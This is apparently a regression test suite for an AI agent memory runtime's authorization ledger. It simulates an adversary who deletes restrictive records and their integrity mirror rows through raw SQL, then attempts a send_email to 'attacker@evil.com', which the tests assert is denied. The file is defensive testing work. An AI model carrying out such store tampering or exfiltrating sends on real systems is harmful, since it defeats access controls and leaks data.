// Regression (v19): the TCB authority-membership ledger (control_plane #membership) has a durable mirror in
// `authority_membership`. The mirror used to carry only (run_id, memory_id, digest) -- NO count, NO MAC --
// which was a FALSE parity claim against the lifecycle_anchor/resolution_anchor heads. On a key-stable
// restart over a shared dbPath, an adversary who deleted BOTH a restrictive (effect_ceiling) record's
// shared_memory row AND its authority_membership mirror row made seedMembership restore a SILENTLY SMALLER
// ledger: the P0-1 deletion-omission alarm in _computeView never fired, the capability meet widened, and a
// send that the in-instance path correctly denies (candidate_tampered) was dispatched after the restart.
//
// The fix gives the membership ledger a MAC-chained durable head (membership_anchor: {count,last_mac,last_seq})
// with TRUE parity to lifecycle/resolution: recordAuthorityMember advances a TCB head MAC, and _verifiedMembership
// throws if the surviving mirror rows do not match the restored count + chain, so a post-restart mirror deletion
// fails closed. Like the lifecycle/resolution anchors, the cross-restart guarantee rests on the durable head
// sitting in protected storage; a fully consistent store-rewriting adversary (who also forges the anchor) is out
// of scope, exactly as it is for those heads.
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { SecureMemoryRuntime, ControlPlane, createSecureMemorySystem } from "../benchmarks/coupled_memory/runtime.mjs";

const env = (o) => ({ run_id: "R", task_id: "T", trace_id: "tr", intent: "produce_final_plan", state: "running",
  policy_context: "P", correlation_id: null, delegated_from: null, parent_message_id: null, ...o });
const ctxOf = (rt, s, m) => rt.controlPlane.contextTokenForLease(rt.claimSpecific(s, m));
const sendOf = (rt, ctx, ses, to) => rt.executeAuthorizedAction(
  { effect: "send", tool: "send_email", parameters: { to } }, rt.queryMemory({}, ctx, ses, "send").viewId, ses, ctx);

const KEY = Buffer.alloc(32, 7); // fixed durable key so the membership MACs verify across the restart
const freshDb = () => join(mkdtempSync(join(tmpdir(), "mbm-mem-")), "shared.db");

// Seed a durable instance: m0 (memory) + two sibling executor messages mxA/mxB descending from m0, plus the
// supplied authority-bearing records (each readable by "executor", sourced at m0 so it is in mxA/mxB's closure).
function seedInstanceA(dbPath, records) {
  const cp = new ControlPlane({ keyBytes: KEY });
  const rt = new SecureMemoryRuntime({ dbPath, controlPlane: cp, destinationPolicy: () => true });
  rt.sendMessage(env({ message_id: "m0", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
  // (v20 creation-cut) Write the m0-sourced authority records BEFORE sending the executor reader messages, then
  // send mxA/mxB LAST with a sequence that clearly exceeds every write_seq, so the reader's signed creation cut
  // admits them (the readers are leaves sourcing no memory, so deferring them is safe).
  const w = cp.registerPrincipal("w", { queues: ["*"] });
  for (const r of records) rt.writeMemory(r.content, rt.claimSpecific(w, "m0"), r.options);
  rt.sendMessage(env({ message_id: "mxA", sender: "c", receiver: "executor", sequence: 90, parent_message_id: "m0" }), cp.registerPrincipal("c", {}));
  rt.sendMessage(env({ message_id: "mxB", sender: "c2", receiver: "executor", sequence: 91, parent_message_id: "m0" }), cp.registerPrincipal("c2", {}));
  return { cp, rt };
}

// Open a fresh durable instance over the SAME db+key (a restart: control-plane principal state is in-memory and
// gone, so the executor is re-registered). `mutate(rt)` runs the store-write adversary before the executor acts.
// (v19 #4) The read surface now fails CLOSED on detected store<->ledger tamper: queryMemory()/read() throw
// `candidate_tampered:<reason>` BEFORE any record (or a silently truncated/widened view) is exposed to the model,
// rather than only denying the downstream action. A harness treats that throw as a fail-closed DENY, so we
// normalize it here to the same {decision,reason} shape the in-instance action path returns -- the security
// property asserted is identical (the tampered restart never dispatches), only it now triggers strictly earlier.
function restartAndSend(dbPath, mutate) {
  const cp = new ControlPlane({ keyBytes: KEY });
  const rt = new SecureMemoryRuntime({ dbPath, controlPlane: cp, destinationPolicy: () => true });
  if (mutate) mutate(rt);
  const ex = cp.registerPrincipal("ex", { queues: ["executor"] });
  const ctx = ctxOf(rt, ex, "mxB");
  let result;
  try { result = sendOf(rt, ctx, ex, "attacker@evil.com"); }
  catch (e) { result = { decision: "DENY", reason: String(e.message).split(":")[0] }; }
  return { cp, rt, result };
}

const RECORDS_CAPPED = [
  { content: "keep", options: { memory_id: "mem-keep", memory_type: "constraint", allowed_readers: ["executor"], effect_ceiling: ["read", "send"] } },
  { content: "cap",  options: { memory_id: "mem-cap",  memory_type: "constraint", allowed_readers: ["executor"], effect_ceiling: ["read"] } },
  { content: "ok",   options: { memory_id: "mem-ok",   memory_type: "note",       allowed_readers: ["executor"] } },
];

test("a key-stable restart that deletes a restrictive record's row AND its membership mirror fails closed", () => {
  const dbPath = freshDb();
  // Instance A baseline: the restrictive mem-cap (ceiling ["read"]) caps the meet, so the send is DENIED.
  { const { rt } = seedInstanceA(dbPath, RECORDS_CAPPED);
    const ex = rt.controlPlane.registerPrincipal("ex0", { queues: ["executor"] });
    const ctx = ctxOf(rt, ex, "mxA");
    assert.deepEqual(sendOf(rt, ctx, ex, "ops@example.com"), { decision: "DENY", reason: "effect_exceeds_ceiling" });
    rt.close(); }

  // Restart over the same db+key; the adversary deletes BOTH the restrictive row and its durable mirror row.
  const { rt, result } = restartAndSend(dbPath, (rt) => {
    rt.db.prepare("DELETE FROM shared_memory WHERE memory_id='mem-cap'").run();
    rt.db.prepare("DELETE FROM authority_membership WHERE memory_id='mem-cap'").run();
  });
  // Pre-fix this dispatched (capability widened past the deleted ceiling). Now it fails CLOSED.
  assert.equal(result.status, undefined, JSON.stringify(result));
  assert.deepEqual(result, { decision: "DENY", reason: "candidate_tampered" });
  // Audit replay flags the same shrink (membership-chain parity with lifecycle/resolution replay).
  const replay = rt.replaySecureMemoryReads("R");
  assert.ok(!replay.ok && replay.issues.some((i) => i.kind === "membership_log_tampered"), JSON.stringify(replay.issues));
  rt.close();
});

test("deleting ONLY the membership mirror row (shared_memory row intact) across a restart is caught", () => {
  const dbPath = freshDb();
  { const { rt } = seedInstanceA(dbPath, RECORDS_CAPPED); rt.close(); }
  const { rt, result } = restartAndSend(dbPath, (rt) => {
    rt.db.prepare("DELETE FROM authority_membership WHERE memory_id='mem-cap'").run(); // mirror desync vs the anchor count
  });
  assert.equal(result.status, undefined, JSON.stringify(result));
  assert.equal(result.decision, "DENY");
  assert.equal(result.reason, "candidate_tampered");
  rt.close();
});

test("a clean key-stable restart preserves authorization (the chain verifies; not a blanket DoS)", () => {
  const dbPath = freshDb();
  // No restrictive record: the only ceiling permits send, so the send is ALLOWED both before and after restart.
  const records = [
    { content: "keep", options: { memory_id: "mem-keep", memory_type: "constraint", allowed_readers: ["executor"], effect_ceiling: ["read", "send"] } },
    { content: "ok",   options: { memory_id: "mem-ok",   memory_type: "note",       allowed_readers: ["executor"] } },
  ];
  { const { rt } = seedInstanceA(dbPath, records);
    const ex = rt.controlPlane.registerPrincipal("ex0", { queues: ["executor"] });
    const ctx = ctxOf(rt, ex, "mxA");
    assert.equal(sendOf(rt, ctx, ex, "ops@example.com").status, "dispatched");
    rt.close(); }
  const { rt, result } = restartAndSend(dbPath, null); // clean restart, no tampering
  assert.equal(result.status, "dispatched", JSON.stringify(result));
  // And the surviving authority record still reads back (the membership chain verified cleanly, no false DENY).
  const ex = rt.controlPlane.registerPrincipal("ex2", { queues: ["executor"] });
  rt.sendMessage(env({ message_id: "mxC", sender: "c3", receiver: "executor", sequence: 92, parent_message_id: "m0" }), rt.controlPlane.registerPrincipal("c3", {}));
  assert.ok(rt.readMemory({}, rt.claimSpecific(ex, "mxC")).map((m) => m.memory_id).includes("mem-keep"));
  assert.ok(rt.replaySecureMemoryReads("R").ok);
  rt.close();
});

test("an authority-bearing write inside executeAuthorizedAction is forbidden (no membership-head desync)", () => {
  // Parity with lifecycle_head_rollback: the only deployer code in the auth txn is the destinationPolicy. A
  // policy-side authority-bearing write would advance the TCB membership head, and a subsequent ROLLBACK could
  // not undo it -> a self-inflicted "count mismatch" DoS. The _assertNotInExec guard forbids it fail-closed.
  const cp = new ControlPlane();
  let admin = null, policyError = null, fired = 0, wsess = null;
  const destinationPolicy = () => {
    if (fired++ === 0) {
      try {
        admin.writeMemory("x", admin.claimSpecific(wsess, "mw"),
          { memory_id: "mem-policy", memory_type: "constraint", allowed_readers: ["alice"], effect_ceiling: ["read"] });
      } catch (e) { policyError = e; }
    }
    return true;
  };
  const sys = createSecureMemorySystem({ controlPlane: cp, destinationPolicy });
  admin = sys.admin; const facade = sys.runtime;
  admin.sendMessage(env({ message_id: "m0", sender: "p", receiver: "memory", sequence: 1 }), cp.registerPrincipal("p", {}));
  admin.sendMessage(env({ message_id: "mw", sender: "pm", receiver: "memory", sequence: 2, parent_message_id: "m0" }), cp.registerPrincipal("pm", {}));
  const w = cp.registerPrincipal("w", { queues: ["*"] });
  wsess = cp.registerPrincipal("w2", { queues: ["*"] });
  // (v20 creation-cut) Write the m0-sourced grant BEFORE sending alice's reader message mx, then send mx LAST with
  // a sequence clearly exceeding the grant's write_seq so the creation cut admits it.
  admin.writeMemory("alice may send", admin.claimSpecific(w, "m0"),
    { memory_id: "mem-grant", memory_type: "constraint", allowed_readers: ["alice"], effect_ceiling: ["send"] });
  admin.sendMessage(env({ message_id: "mx", sender: "c", receiver: "alice", sequence: 90, parent_message_id: "m0" }), cp.registerPrincipal("c", {}));
  const alice = cp.registerPrincipal("alice", { queues: ["alice"] });
  const ctx = cp.contextTokenForLease(admin.claimSpecific(alice, "mx"));
  const headBefore = cp.membershipHead().count;

  facade.executeAuthorizedAction(alice, ctx, facade.queryMemory(alice, ctx, {}, "send").viewId,
    { effect: "send", tool: "send_email", parameters: { to: "x@partner.com" } });

  // The guard fired and the head never advanced (still equals the persisted mirror-row count -> no desync).
  assert.match(String(policyError?.message), /lifecycle_mutation_during_authorization/);
  assert.equal(cp.membershipHead().count, headBefore);
  assert.equal(cp.membershipHead().count, admin.db.prepare("SELECT COUNT(*) AS n FROM authority_membership").get().n);
  // The kernel remains usable (no permanent count-mismatch DoS) and the policy-side record was rolled back.
  assert.deepEqual(facade.read(alice, ctx, {}).map((m) => m.memory_id), ["mem-grant"]);
  admin.close();
});
